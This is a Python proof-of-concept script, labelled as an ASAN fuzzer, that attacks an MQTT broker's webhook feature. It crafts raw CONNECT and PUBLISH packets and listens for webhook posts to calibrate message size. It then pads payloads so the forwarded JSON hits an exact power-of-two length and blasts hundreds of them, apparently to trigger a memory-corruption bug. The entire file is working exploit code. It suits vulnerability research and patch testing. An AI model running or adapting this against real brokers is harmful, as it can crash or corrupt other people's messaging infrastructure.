import socket
import time
import struct
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional, Tuple


class WebhookHandler(BaseHTTPRequestHandler):
    """HTTP handler to capture webhook POST requests."""
    
    last_len: Optional[int] = None
    event = threading.Event()
    
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        _ = self.rfile.read(n) if n else b''
        WebhookHandler.last_len = n
        WebhookHandler.event.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


class MQTTFuzzer:
    """MQTT Webhook Fuzzer for testing ASAN vulnerabilities."""
    
    def __init__(self, mqtt_host: str = "127.0.0.1", mqtt_port: int = 1883,
                 http_port: int = 8888, topic: bytes = b"poc/asan",
                 client_id: bytes = b"asan-webhook"):
        self.mqtt_host = mqtt_host
        self.mqtt_port = mqtt_port
        self.http_port = http_port
        self.topic = topic
        self.client_id = client_id
        self.socket: Optional[socket.socket] = None
        self.http_server: Optional[HTTPServer] = None
        self.http_thread: Optional[threading.Thread] = None
    
    @staticmethod
    def enc_varint(x: int) -> bytes:
        """Encode integer as MQTT variable length integer."""
        out = b""
        while True:
            digit = x % 128
            x //= 128
            if x > 0:
                digit |= 0x80
            out += bytes([digit])
            if x == 0:
                break
        return out
    
    @staticmethod
    def build_connect(client_id: bytes) -> bytes:
        """Build MQTT CONNECT packet (v3.1.1)."""
        vh = b"\x00\x04MQTT\x04\x02\x00\x3c"
        payload = struct.pack("!H", len(client_id)) + client_id
        rem = len(vh) + len(payload)
        return b"\x10" + MQTTFuzzer.enc_varint(rem) + vh + payload
    
    @staticmethod
    def build_publish(topic: bytes, payload: bytes) -> bytes:
        """Build MQTT PUBLISH packet."""
        vh = struct.pack("!H", len(topic)) + topic
        rem = len(vh) + len(payload)
        return b"\x30" + MQTTFuzzer.enc_varint(rem) + vh + payload
    
    @staticmethod
    def next_pow2(x: int) -> int:
        """Get next power of 2 >= x."""
        p = 1
        while p < x:
            p <<= 1
        return p
    
    def start_http_server(self):
        """Start HTTP webhook server in background thread."""
        def run_server():
            self.http_server = HTTPServer(("0.0.0.0", self.http_port), WebhookHandler)
            self.http_server.serve_forever()
        
        self.http_thread = threading.Thread(target=run_server, daemon=True)
        self.http_thread.start()
        time.sleep(0.5)  # Give server time to start
    
    def connect_mqtt(self):
        """Connect to MQTT broker."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.mqtt_host, self.mqtt_port))
        self.socket.sendall(self.build_connect(self.client_id))
        time.sleep(1)
    
    def calibrate_payload(self, trial_size: int = 1000, 
                         target_min: int = 1024,
                         timeout: float = 5.0) -> Tuple[int, int]:
        """
        Calibrate payload size to achieve power-of-2 JSON length.
        
        Args:
            trial_size: Initial payload size for testing
            target_min: Minimum target JSON size (power of 2)
            timeout: Timeout for webhook response
        
        Returns:
            Tuple of (payload_len, target_json_len)
        
        Raises:
            TimeoutError: If no webhook response received
        """
        # Send trial payload
        WebhookHandler.event.clear()
        WebhookHandler.last_len = None
        
        self.socket.sendall(self.build_publish(self.topic, b"A" * trial_size))
        print(f"Sent trial payload: {trial_size} bytes")
        
        if not WebhookHandler.event.wait(timeout):
            raise TimeoutError("No webhook response, check config/topic")
        
        json_len = WebhookHandler.last_len
        delta = json_len - trial_size
        print(f"Trial: payload={trial_size}, json={json_len}, delta={delta}")
        
        # Compute target payload size
        target = self.next_pow2(max(target_min, json_len))
        payload_len = target - delta
        
        if payload_len <= 0:
            target = self.next_pow2(target + 1)
            payload_len = target - delta
        
        # Verify calibration
        WebhookHandler.event.clear()
        self.socket.sendall(self.build_publish(self.topic, b"A" * payload_len))
        WebhookHandler.event.wait(2)
        
        actual_json = WebhookHandler.last_len
        print(f"Calibration: payload={payload_len}, json={actual_json}, target={target}")
        
        return payload_len, target
    
    def blast_packets(self, payload_len: int, count: int = 500, 
                     delay_interval: int = 10, delay_time: float = 0.01):
        """
        Send multiple MQTT packets rapidly.
        
        Args:
            payload_len: Size of payload in each packet
            count: Number of packets to send
            delay_interval: Add delay every N packets
            delay_time: Delay duration in seconds
        """
        pkt = self.build_publish(self.topic, b"A" * payload_len)
        
        for i in range(count):
            self.socket.sendall(pkt)
            if i % delay_interval == 0:
                time.sleep(delay_time)
        
        print(f"Sent {count} packets")
    
    def close(self):
        """Clean up resources."""
        if self.socket:
            self.socket.close()
        if self.http_server:
            self.http_server.shutdown()
    
    def run_fuzzer(self, trial_size: int = 1000, blast_count: int = 500):
        """
        Run complete fuzzing workflow.
        
        Args:
            trial_size: Initial trial payload size
            blast_count: Number of packets to blast
        """
        try:
            print("Starting HTTP webhook server...")
            self.start_http_server()
            
            print("Connecting to MQTT broker...")
            self.connect_mqtt()
            
            print("Calibrating payload...")
            payload_len, target = self.calibrate_payload(trial_size)
            
            print("Blasting packets...")
            self.blast_packets(payload_len, blast_count)
            
            print("Done!")
        finally:
            self.close()


def run_mqtt_fuzzer(mqtt_host: str = "127.0.0.1", 
                   mqtt_port: int = 1883,
                   http_port: int = 8888,
                   topic: str = "poc/asan",
                   client_id: str = "asan-webhook",
                   trial_size: int = 1000,
                   blast_count: int = 500):
    """
    Convenience function to run MQTT fuzzer with default parameters.
    
    Args:
        mqtt_host: MQTT broker hostname
        mqtt_port: MQTT broker port
        http_port: HTTP webhook server port
        topic: MQTT topic to publish to
        client_id: MQTT client identifier
        trial_size: Initial trial payload size
        blast_count: Number of packets to blast
    
    Example:
        >>> run_mqtt_fuzzer(
        ...     mqtt_host="localhost",
        ...     mqtt_port=1883,
        ...     topic="test/webhook"
        ... )
    """
    fuzzer = MQTTFuzzer(
        mqtt_host=mqtt_host,
        mqtt_port=mqtt_port,
        http_port=http_port,
        topic=topic.encode() if isinstance(topic, str) else topic,
        client_id=client_id.encode() if isinstance(client_id, str) else client_id
    )
    fuzzer.run_fuzzer(trial_size, blast_count)